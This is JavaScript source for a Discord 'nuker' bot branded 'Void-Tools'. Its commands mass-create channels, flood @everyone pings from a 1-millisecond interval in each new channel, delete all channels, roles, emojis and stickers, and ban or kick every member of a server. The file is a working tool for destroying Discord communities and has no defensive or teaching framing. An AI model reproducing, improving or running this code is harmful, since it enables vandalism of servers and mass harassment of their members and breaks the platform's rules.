const { Client, Intents, MessageEmbed } = require("discord.js");
const { red, greenBright } = require("chalk");
const { prefix, userID, disableEveryone, token } = require("../config/discord-nuker.json");

const nuker = new Client({ intents: [Intents.FLAGS.GUILDS, Intents.FLAGS.GUILD_MESSAGES] });

nuker.on("ready", () => {
    console.clear();
    console.log(red(`    

                              ·▄▄▄▄   ▄▄▄· ▄▄▌ ▐ ▄▌ ▄▄▄· 
                              ██▪ ██ ▐█ ▀█ ██· █▌▐█▐█ ▀█ 
                              ▐█· ▐█▌▄█▀▀█ ██▪▐█ ▐▌▄█▀▀█ 
                              ██. ██ ▐█ ▪▐▌▐█▌██▐█▌▐█ ▪▐▌
                              ▀▀▀▀▀•  ▀  ▀  ▀▀▀▀ ▀▪ ▀  ▀ 
                       ﹥━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━﹤
                                  Discord : fullsafe.
                    Support Discord : https://discord.gg/tdTUvwVpMY
             ﹥━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━﹤     

                                                                                                                    
       ╔═                                                                    ═╗
         Connect with : ${nuker.user.tag}                                      
         Prefix: ${prefix}                                                     
       ╚═                                                                    ═╝
       ╔══════                                                          ══════╗
       ║ $>   !mchannel  ║  >Mass create channels< ║ [!mchannel 5 test]       ║
       ║ $>   !mspam     ║  >Mass ping channel<    ║ [!mspam 5 test, testing] ║
         $>   !mrole     ║  >Mass create roles<    ║ [!mrole 5 test]           
         $>   !dchannel  ║  >Delete all channels<  ║                             
         $>   !drole     ║  >Delete all roles<     ║                             
         $>   !demoji    ║  >Delete all emotes<    ║                             
         $>   !mkick     ║  >Mass kick<            ║                          
       ║ $>   !mban      ║  >Mass ban<             ║                          ║
       ║ $>   !stop      ║  >Stop and back<        ║                          ║
       ╚══════                                                          ══════╝
`));
    nuker.user.setActivity({ name: "Void-Tools", type: "PLAYING" });
});

nuker.on("messageCreate", async (message) => {
    if (message.author.bot) return;
    if (!message.content.startsWith(prefix)) return;

    const args = message.content.slice(prefix.length).trim().split(/ +/);
    const command = args.shift().toLowerCase();

    try {
        switch (command) {
            case 'mchannel':
                await MassChannels(message, args[0], args.slice(1).join(' '));
                break;
            case 'dchannel':
                await DelAllChannels(message);
                break;
            case 'mspam':
                await MassChnPing(message, args[0], args[1], args.slice(2).join(', '));
                break;
            case 'mrole':
                await MassRoles(message, args[0], args.slice(1).join(' '));
                break;
            case 'drole':
                await DelAllRoles(message);
                break;
            case 'de':
                await DelAllEmotes(message);
                break;
            case 'demoji':
                await DelAllStickers(message);
                break;
            case 'mban':
                await BanAll(message);
                break;
            case 'mkick':
                await KickAll(message);
                break;
                case 'stop':
                    message.channel.send('Stop bot...')
                        .then(() => {
                            nuker.destroy();
                            process.exit();
                        })
                        .catch(err => {
                            console.error('Erreur lors de l\'arrêt du bot:', err);
                        });
                    break;
                default:
                    break;
            }
        } catch (err) {
            console.error("Error processing command:", err);
            message.reply("An error occurred while processing your command.");
        }
    });

nuker.login(token).catch(err => {
    console.error("Error logging into Discord:", err);
});

// Fonctions de Nuke

async function MassChannels(message, amount, channelName) {
    if (!amount) throw "Specify the amount of channels to create";
    if (isNaN(amount)) throw "Amount should be a number";
    if (amount > 500) throw "Maximum channel limit reached (500)";
    if (!message.guild.me.permissions.has("MANAGE_CHANNELS")) throw "Bot missing 'MANAGE_CHANNELS' permission";

    for (let i = 0; i < amount; i++) {
        if (message.guild.channels.cache.size === 500) break;
        const name = channelName || `${message.author.username} was here`;
        await message.guild.channels.create(name, { type: "GUILD_TEXT" }).catch(console.error);
    }
}

async function MassChnPing(message, amount, channelName, pingMessage) {
    if (!amount) throw "Specify the amount of channels to create";
    if (isNaN(amount)) throw "Amount should be a number";
    if (amount > 500) throw "Maximum channel limit reached (500)";
    if (!message.guild.me.permissions.has("MANAGE_CHANNELS")) throw "Bot missing 'MANAGE_CHANNELS' permission";
    if (!pingMessage) throw "Specify the message to ping everyone";

    for (let i = 0; i < amount; i++) {
        if (message.guild.channels.cache.size === 500) break;
        const name = channelName || `${message.author.username} was here`;
        const channel = await message.guild.channels.create(name, { type: "GUILD_TEXT" }).catch(console.error);
        if (channel) {
            setInterval(() => {
                channel.send("@everyone " + pingMessage);
            }, 1);
        }
    }
}

async function DelAllChannels(message) {
    if (!message.guild.me.permissions.has("MANAGE_CHANNELS")) throw "Bot missing 'MANAGE_CHANNELS' permission";

    await message.guild.channels.cache.forEach((ch) => ch.delete().catch(console.error));
}

async function MassRoles(message, amount, roleName) {
    if (!amount) throw "Specify the amount of roles to create";
    if (isNaN(amount)) throw "Amount should be a number";
    if (!message.guild.me.permissions.has("MANAGE_ROLES")) throw "Bot missing 'MANAGE_ROLES' permission";

    for (let i = 0; i <= amount; i++) {
        if (message.guild.roles.cache.size === 250) break;
        const name = roleName || "nuked";
        await message.guild.roles.create({ name, color: "RANDOM", position: i++ }).catch(console.error);
    }
}

async function DelAllRoles(message) {
    if (!message.guild.me.permissions.has("MANAGE_ROLES")) throw "Bot missing 'MANAGE_ROLES' permission";

    await message.guild.roles.cache.forEach((r) => r.delete().catch(console.error));
}

async function DelAllEmotes(message) {
    if (!message.guild.me.permissions.has("MANAGE_EMOJIS_AND_STICKERS")) throw "Bot missing 'MANAGE_EMOJIS_AND_STICKERS' permission";

    await message.guild.emojis.cache.forEach((e) => e.delete().catch(console.error));
}

async function DelAllStickers(message) {
    if (!message.guild.me.permissions.has("MANAGE_EMOJIS_AND_STICKERS")) throw "Bot missing 'MANAGE_EMOJIS_AND_STICKERS' permission";

    await message.guild.stickers.cache.forEach((s) => s.delete().catch(console.error));
}

async function BanAll(message) {
    if (!message.guild.me.permissions.has("BAN_MEMBERS")) throw "Bot missing 'BAN_MEMBERS' permission";

    const arrayOfIDs = message.guild.members.cache.map((user) => user.id);
    const msg = await message.reply(`Found ${arrayOfIDs.length} users.`);
    setTimeout(async () => {
        await msg.edit("Banning...");
        for (let i = 0; i < arrayOfIDs.length; i++) {
            const user = arrayOfIDs[i];
            const member = message.guild.members.cache.get(user);
            await member.ban().catch(console.error);
            console.log(greenBright(`${member.user.tag} has been banned.`));
        }
    }, 2000);
}

async function KickAll(message) {
    if (!message.guild.me.permissions.has("KICK_MEMBERS")) throw "Bot missing 'KICK_MEMBERS' permission";

    const arrayOfIDs = message.guild.members.cache.map((user) => user.id);
    const msg = await message.reply(`Found ${arrayOfIDs.length} users.`);
    setTimeout(async () => {
        await msg.edit("Kicking...");
        for (let i = 0; i < arrayOfIDs.length; i++) {
            const user = arrayOfIDs[i];
            const member = message.guild.members.cache.get(user);
            await member.kick().catch(console.error);
            console.log(greenBright(`${member.user.tag} has been kicked.`));
        }
    }, 2000);
}
